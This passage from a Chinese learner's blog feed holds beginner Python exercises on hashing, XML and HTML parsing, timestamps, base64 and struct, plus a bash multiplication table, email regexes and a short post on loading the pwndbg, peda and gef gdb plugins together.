class="string">'the-Salt'</span>)</span><br><span class="line">然后，根据修改后的 MD5 算法实现用户登录的验证：</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这种题目也是送分题啊，直接贴代码了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">db = &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_md5</span><span class="params">(passwd)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(passwd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    db[username] = calc_md5(password + username + <span class="string">'the-Salt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> db[username] == calc_md5(password + username + <span class="string">'the-Salt'</span>):</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"sucess"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"fail"</span>)</span><br><span class="line"></span><br><span class="line">register(<span class="string">'bob'</span>,<span class="string">'123456'</span>)</span><br><span class="line">register(<span class="string">'robot'</span>,<span class="string">'123456'</span>)</span><br><span class="line">login(<span class="string">'bob'</span>,<span class="string">'12345'</span>)</span><br><span class="line">login(<span class="string">'bob'</span>,<span class="string">'123456'</span>)</span><br></pre></td></tr></table></figure><h2 id="xml解析"><a href="#xml解析" class="headerlink" title="xml解析"></a>xml解析</h2><p><strong>请利用 SAX 编写程序解析 Yahoo 的 XML 格式的天气预报，获取当天<br>和第二天的天气：</strong><br>这部分对我来说有点难理解，不过查阅资料和看博客后自己依葫芦画瓢还是做出来了<br>贴上代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> xml.parsers.expat <span class="keyword">import</span> ParserCreate</span><br><span class="line">data = <span class="string">r'''&lt;?xml version="1.0" encoding="UTF-8" standalone="yes" ?&gt;</span></span><br><span class="line"><span class="string">&lt;rss version="2.0" xmlns:yweather="http://xml.weather.yahoo.com/ns/rss/1.0" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"&gt;</span></span><br><span class="line"><span class="string">    &lt;channel&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Yahoo! Weather - Beijing, CN&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;lastBuildDate&gt;Wed, 27 May 2015 11:00 am CST&lt;/lastBuildDate&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:location city="Beijing" region="" country="China"/&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:units temperature="C" distance="km" pressure="mb" speed="km/h"/&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:wind chill="28" direction="180" speed="14.48" /&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:atmosphere humidity="53" visibility="2.61" pressure="1006.1" rising="0" /&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:astronomy sunrise="4:51 am" sunset="7:32 pm"/&gt;</span></span><br><span class="line"><span class="string">        &lt;item&gt;</span></span><br><span class="line"><span class="string">            &lt;geo:lat&gt;39.91&lt;/geo:lat&gt;</span></span><br><span class="line"><span class="string">            &lt;geo:long&gt;116.39&lt;/geo:long&gt;</span></span><br><span class="line"><span class="string">            &lt;pubDate&gt;Wed, 27 May 2015 11:00 am CST&lt;/pubDate&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:condition text="Haze" code="21" temp="28" date="Wed, 27 May 2015 11:00 am CST" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Wed" date="27 May 2015" low="20" high="33" text="Partly Cloudy" code="30" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Thu" date="28 May 2015" low="21" high="34" text="Sunny" code="32" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Fri" date="29 May 2015" low="18" high="25" text="AM Showers" code="39" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Sat" date="30 May 2015" low="18" high="32" text="Sunny" code="32" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Sun" date="31 May 2015" low="20" high="37" text="Sunny" code="32" /&gt;</span></span><br><span class="line"><span class="string">        &lt;/item&gt;</span></span><br><span class="line"><span class="string">    &lt;/channel&gt;</span></span><br><span class="line"><span class="string">&lt;/rss&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">weather_dict=&#123;&#125;</span><br><span class="line">day = <span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WeatherSaxHandler</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_element</span><span class="params">(self, name, attrs)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> weather_dict,day</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">'yweather:location'</span>:</span><br><span class="line">            weather_dict[<span class="string">'city'</span>] = attrs[<span class="string">'city'</span>]</span><br><span class="line">            weather_dict[<span class="string">'country'</span>] = attrs[<span class="string">'country'</span>]</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">'yweather:forecast'</span>:</span><br><span class="line">            day = day + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> day == <span class="number">1</span> :</span><br><span class="line">                weather_dict[<span class="string">'today'</span>]=&#123;<span class="string">'text'</span>:attrs[<span class="string">'text'</span>], <span class="string">'low'</span>:int(attrs[<span class="string">'low'</span>]), <span class="string">'high'</span>:int(attrs[<span class="string">'high'</span>])&#125;</span><br><span class="line">            <span class="keyword">if</span> day == <span class="number">2</span> :</span><br><span class="line">                weather_dict[<span class="string">'tomorrow'</span>]=&#123;<span class="string">'text'</span>:attrs[<span class="string">'text'</span>], <span class="string">'low'</span>:int(attrs[<span class="string">'low'</span>]), <span class="string">'high'</span>:int(attrs[<span class="string">'high'</span>])&#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">end_element</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">char_data</span><span class="params">(self, text)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_weather</span><span class="params">(xml)</span>:</span></span><br><span class="line">    handler = WeatherSaxHandler()</span><br><span class="line">    parser = ParserCreate()</span><br><span class="line">    parser.StartElementHandler = handler.start_element</span><br><span class="line">    parser.CharacterDataHandler = handler.char_data</span><br><span class="line">    parser.EndElementHandler = handler.end_element</span><br><span class="line">    parser.Parse(xml)</span><br><span class="line">    <span class="keyword">return</span> weather_dict</span><br><span class="line"></span><br><span class="line">weather = parse_weather(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'city'</span>] == <span class="string">'Beijing'</span>, weather[<span class="string">'city'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'country'</span>] == <span class="string">'China'</span>, weather[<span class="string">'country'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'today'</span>][<span class="string">'text'</span>] == <span class="string">'Partly Cloudy'</span>,weather[<span class="string">'today'</span>][<span class="string">'text'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'today'</span>][<span class="string">'low'</span>] == <span class="number">20</span>, weather[<span class="string">'today'</span>][<span class="string">'low'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'today'</span>][<span class="string">'high'</span>] == <span class="number">33</span>, weather[<span class="string">'today'</span>][<span class="string">'high'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'tomorrow'</span>][<span class="string">'text'</span>] == <span class="string">'Sunny'</span>,weather[<span class="string">'tomorrow'</span>][<span class="string">'text'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'tomorrow'</span>][<span class="string">'low'</span>] == <span class="number">21</span>, weather[<span class="string">'tomorrow'</span>][<span class="string">'low'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'tomorrow'</span>][<span class="string">'high'</span>] == <span class="number">34</span>, weather[<span class="string">'tomorrow'</span>][<span class="string">'high'</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Weather:'</span>, str(weather))</span><br></pre></td></tr></table></figure><h2 id="html解析"><a href="#html解析" class="headerlink" title="html解析"></a>html解析</h2><p><strong>找一个网页，例如 <span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9ldmVudHMvcHl0aG9uLWV2ZW50cy/vvIznlKjmtY/op4jlmajmn6XnnIvmupDnoIHlubblpI3liLbvvIznhLblkI7lsJ3or5Xop6PmnpDkuIDkuIs=" title="https://www.python.org/events/python-events/，用浏览器查看源码并复制，然后尝试解析一下">https://www.python.org/events/python-events/，用浏览器查看源码并复制，然后尝试解析一下<i class="fa fa-external-link"></i></span> HTML，输出 Python 官网发布的会议时间、名称和地点</strong></p><ul><li>代码抄别人的，不过懂了，自己打了一遍<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> html.parser <span class="keyword">import</span> HTMLParser</span><br><span class="line"><span class="keyword">from</span> html.entities <span class="keyword">import</span> name2codepoint</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHTMLParser</span><span class="params">(HTMLParser)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        HTMLParser.__init__(self)</span><br><span class="line">        self.is_time = <span class="literal">False</span></span><br><span class="line">        self.is_title = <span class="literal">False</span></span><br><span class="line">        self.is_year = <span class="literal">False</span></span><br><span class="line">        self.is_location = <span class="literal">False</span></span><br><span class="line">        self.info = []</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_starttag</span><span class="params">(self, tag, attrs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'time'</span>:</span><br><span class="line">            self.is_time = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'h3'</span> <span class="keyword">and</span> (<span class="string">'class'</span>, <span class="string">'event-title'</span>) <span class="keyword">in</span> attrs:</span><br><span class="line">            self.is_title = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'span'</span> <span class="keyword">and</span> (<span class="string">'class'</span>, <span class="string">'event-location'</span>) <span class="keyword">in</span> attrs:</span><br><span class="line">            self.is_location = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'span'</span> <span class="keyword">and</span> (<span class="string">'class'</span>, <span class="string">'say-no-more'</span>) <span class="keyword">in</span> attrs:</span><br><span class="line">            self.is_year = <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_data</span><span class="params">(self,data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.is_time:</span><br><span class="line">            self.is_time = <span class="literal">False</span></span><br><span class="line">            mydict = &#123;<span class="string">'time'</span>:data&#125;</span><br><span class="line">            self.info.append(mydict)</span><br><span class="line">        <span class="keyword">if</span> self.is_title:</span><br><span class="line">            self.is_title = <span class="literal">False</span></span><br><span class="line">            mydict = &#123;<span class="string">'title'</span>:data&#125;</span><br><span class="line">            self.info.append(mydict)</span><br><span class="line">        <span class="keyword">if</span> self.is_location:</span><br><span class="line">            self.is_location = <span class="literal">False</span></span><br><span class="line">            mydict = &#123;<span class="string">'location'</span>:data&#125;</span><br><span class="line">            self.info.append(mydict)</span><br><span class="line">        <span class="keyword">if</span> self.is_year:</span><br><span class="line">            self.is_year = <span class="literal">False</span></span><br><span class="line">            mydict = &#123;<span class="string">'date'</span>:data&#125;</span><br><span class="line">            <span class="keyword">if</span> re.match(<span class="string">r'[0-9]'</span>,data.strip()):</span><br><span class="line">                self.info.append(mydict)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getinfo</span><span class="params">(data)</span>:</span></span><br><span class="line">    parser = MyHTMLParser()</span><br><span class="line">    parser.feed(data)</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> parser.info:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> x:</span><br><span class="line">            print(key + <span class="string">':'</span> + str(x[key]))</span><br><span class="line">        count = count + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">'--------------------------------'</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.html'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    htmlcont = f.read()</span><br><span class="line">    getinfo(htmlcont)</span><br></pre></td></tr></table></figure></li></ul><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/b164eb0e/">https://noone-hub.github.io/posts/b164eb0e/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第六天学习</title>
    <url>/posts/98ab9219/</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="时间库练习"><a href="#时间库练习" class="headerlink" title="时间库练习"></a>时间库练习</h2><p><strong>假设你获取了用户输入的日期和时间如 2015-1-21 9:01:30，以及一个时区信息如UTC+5:00，均是 str，请编写一个函数将其转换为 timestamp：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timezone, timedelta</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_timestamp</span><span class="params">(dt_str, tz_str)</span>:</span></span><br><span class="line">----</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">----</span><br><span class="line"><span class="comment"># 测试:</span></span><br><span class="line">t1 = to_timestamp(<span class="string">'2015-6-1 08:10:30'</span>, <span class="string">'UTC+7:00'</span>)</span><br><span class="line"><span class="keyword">assert</span> t1 == <span class="number">1433121030.0</span>, t1</span><br><span class="line">t2 = to_timestamp(<span class="string">'2015-5-31 16:10:30'</span>, <span class="string">'UTC-09:00'</span>)</span><br><span class="line"><span class="keyword">assert</span> t2 == <span class="number">1433121030.0</span>, t2</span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>贴上我的代码，不难，不过我写的有点复杂了感觉</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime,timezone,timedelta</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_timestamp</span><span class="params">(info,where)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(info,str) <span class="keyword">or</span> <span class="keyword">not</span> isinstance(where,str): <span class="comment">#用户错误输入处理</span></span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"wrong input"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    now = datetime.strptime(info,<span class="string">"%Y-%m-%d %H:%M:%S"</span>) <span class="comment">#格式化时间</span></span><br><span class="line">    temp = re.match(<span class="string">r'^(UTC)([+-])([0-9]+):([0-9]+)'</span>,where).groups() <span class="comment">#正则匹配分割时间，应该有更简便的办法，我顺便练习下正则</span></span><br><span class="line">    temp = int(temp[<span class="number">1</span>]+temp[<span class="number">2</span>]) <span class="comment">#字符串转换成数字</span></span><br><span class="line">    now = now.replace(tzinfo=timezone(timedelta(hours=temp))) <span class="comment">#转换成带时区的时间</span></span><br><span class="line">    <span class="keyword">return</span> now.timestamp() <span class="comment">#转换成timestamp</span></span><br><span class="line"></span><br><span class="line">t1 = to_timestamp(<span class="string">'2015-6-1 08:10:30'</span>, <span class="string">'UTC+7:00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> t1 == <span class="number">1433121030.0</span>, t1</span><br><span class="line"></span><br><span class="line">t2 = to_timestamp(<span class="string">'2015-5-31 16:10:30'</span>, <span class="string">'UTC-09:00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> t2 == <span class="number">1433121030.0</span>, t2</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure><h2 id="处理base64无等号版编码"><a href="#处理base64无等号版编码" class="headerlink" title="处理base64无等号版编码"></a>处理base64无等号版编码</h2><p><strong>请写一个能处理去掉=的 base64 解码函数：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_base64_decode</span><span class="params">(s)</span>:</span></span><br><span class="line">----</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">----</span><br><span class="line"><span class="comment"># 测试:</span></span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'abcd'</span> == safe_base64_decode(<span class="string">b'YWJjZA=='</span>),</span><br><span class="line">safe_base64_decode(<span class="string">'YWJjZA=='</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'abcd'</span> == safe_base64_decode(<span class="string">b'YWJjZA'</span>),</span><br><span class="line">safe_base64_decode(<span class="string">'YWJjZA'</span>)</span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure><ul><li>题目不难。。然后我发觉题目给的测试是有误的，assert加逗号，后面那部分出错后是不会执行的，他的想法是对的，然而写法是错的</li><li>然后python3我代码没过，python2过了，具体细节待研究<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_base64_decode</span><span class="params">(s)</span>:</span></span><br><span class="line">    length = len(s)</span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> length%<span class="number">4</span> == <span class="number">0</span> :</span><br><span class="line">        result = base64.b64decode(s)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = base64.b64decode(str(s) + (length%<span class="number">4</span>)*<span class="string">'='</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'abcd'</span> == safe_base64_decode(<span class="string">b'YWJjZA=='</span>)</span><br><span class="line"></span><br><span class="line">safe_base64_decode(<span class="string">'YWJjZA=='</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'abcd'</span> == safe_base64_decode(<span class="string">b'YWJjZA'</span>)</span><br><span class="line"></span><br><span class="line">safe_base64_decode(<span class="string">'YWJjZA'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure></li></ul><h2 id="struct的使用"><a href="#struct的使用" class="headerlink" title="struct的使用"></a>struct的使用</h2><p><strong>练习：请编写一个 bmpinfo.py，可以检查任意文件是否是位图文件，如果是，打印出图片大小和颜色数。</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read(<span class="number">30</span>)</span><br><span class="line">    temp = struct.unpack(<span class="string">'&lt;ccIIIIIIHH'</span>,data)</span><br><span class="line">    <span class="keyword">if</span> temp[<span class="number">0</span>] == <span class="string">'B'</span> <span class="keyword">and</span> (temp[<span class="number">1</span>]==<span class="string">'M'</span> <span class="keyword">or</span> temp[<span class="number">1</span>]==<span class="string">'A'</span>):</span><br><span class="line">        print(<span class="string">'size :&#123;&#125;*&#123;&#125;,color:&#123;&#125;'</span>.format(temp[<span class="number">6</span>],temp[<span class="number">7</span>],temp[<span class="number">9</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">'wrong file'</span>)</span><br><span class="line"></span><br><span class="line">judge(<span class="string">'1.py'</span>)</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/98ab9219/">https://noone-hub.github.io/posts/98ab9219/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>shell-1</title>
    <url>/posts/b45040e8/</url>
    <content><![CDATA[<h1 id="shell脚本学习"><a href="#shell脚本学习" class="headerlink" title="shell脚本学习"></a>shell脚本学习</h1><h2 id="九九乘法表"><a href="#九九乘法表" class="headerlink" title="九九乘法表"></a>九九乘法表</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> `seq 9`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> `seq <span class="variable">$n</span>`</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">"<span class="variable">$m</span>*<span class="variable">$n</span>="</span>`expr <span class="variable">$m</span> \* <span class="variable">$n</span>`<span class="string">"   "</span>  </span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/b45040e8/">https://noone-hub.github.io/posts/b45040e8/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>shell脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第五天学习</title>
    <url>/posts/2c7ac85e/</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="正则学习"><a href="#正则学习" class="headerlink" title="正则学习"></a>正则学习</h2><p><strong>练习题：请尝试写一个验证 Email 地址的正则表达式。版本一应该可以验证出类似的 Email：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.match(<span class="string">r'^([0-9a-zA-Z\_\.]+)@([0-9a-zA-Z\_]+).([a-zA-Z]+)'</span>,<span class="string">'bill.gates@microsoft.com'</span>).groups()</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p><strong>版本二可以验证并提取出带名字的 Email 地址：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.match(<span class="string">r'^(&lt;[a-zA-Z\s]+&gt;)\s([0-9a-zA-Z\_\.\&lt;\&gt;]+)@([0-9a-zA-Z\_]+).([a-zA-Z]+)'</span>,<span class="string">'&lt;Tom Paris&gt; tom@voyager.org'</span>).groups()</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/2c7ac85e/">https://noone-hub.github.io/posts/2c7ac85e/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>gdb_config</title>
    <url>/posts/f3251790/</url>
    <content><![CDATA[<p>在不久前，我很讨厌gdb这种调试器，在windows下熟悉了ollydbg的我，遇上了纯命令的gdb调试器很是费劲，所以我前段时间研究了下gdb的插件peda，pwndbg(专用于pwn)，gef这些个插件，网上你可以去找教程，那些教程都是说如何切换三个调试器，而我的重点是 <strong>三个插件如何一起使用</strong></p><h1 id="如何同时使用gef-pwndbg-peda三个插件？"><a href="#如何同时使用gef-pwndbg-peda三个插件？" class="headerlink" title="如何同时使用gef,pwndbg,peda三个插件？"></a>如何同时使用gef,pwndbg,peda三个插件？</h1><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>我研究了一番gdbinit的这份文件，有人说，这不就是几个source吗，有什么好研究的？确实如此，gdbinit里就是几个环境变量的配置，然而用不用的好就是另一回事了，经过我一番推敲，发觉这份配置是不会出错的配置，可以同时使用三个插件，下面先贴上gdbinit部分配置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.pwndbg/gdbinit.py</span><br><span class="line"><span class="built_in">source</span> ~/.peda/peda.py</span><br><span class="line"><span class="built_in">source</span> ~/.gdbinit-gef.py</span><br></pre></td></tr></table></figure><p>这个顺序不要调换，调换后会报错，具体pwndbg和peda和gef的安装，我就不教了，如果这个都不会，你装三个插件折腾个啥，一个插件就够你用了，有人看不懂这几句话，我也没办法，你照着改就好了。</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/f3251790/">https://noone-hub.github.io/posts/f3251790/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>环境</category>
      </categories>
      <tags>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第四天学习</title>
    <url>/posts/1c68fab/</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="模块测试"><a href="#模块测试" class="headerlink" title="模块测试"></a>模块测试</h2><p>这部分没有例子，我也就没去写了，总的来说可以测试数据的合理性，没有通过模块测试一定有bug，不过你模块测试都写错了，那就没得说了</p><h2 id="文档测试"><a href="#文档测试" class="headerlink" title="文档测试"></a>文档测试</h2><p>练习：对函数 fact(n)编写 doctest 并执行：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fact</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">----</span></span><br><span class="line"><span class="string">----</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError()</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n * fact(n - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> doctest</span><br><span class="line">    doctest.testmod()</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><ul><li>上述为题目简介</li></ul><p>贴上代码，简单：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fact</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fact(1)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fact(2)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fact(3)</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fact(4)</span></span><br><span class="line"><span class="string">    24</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError()</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span 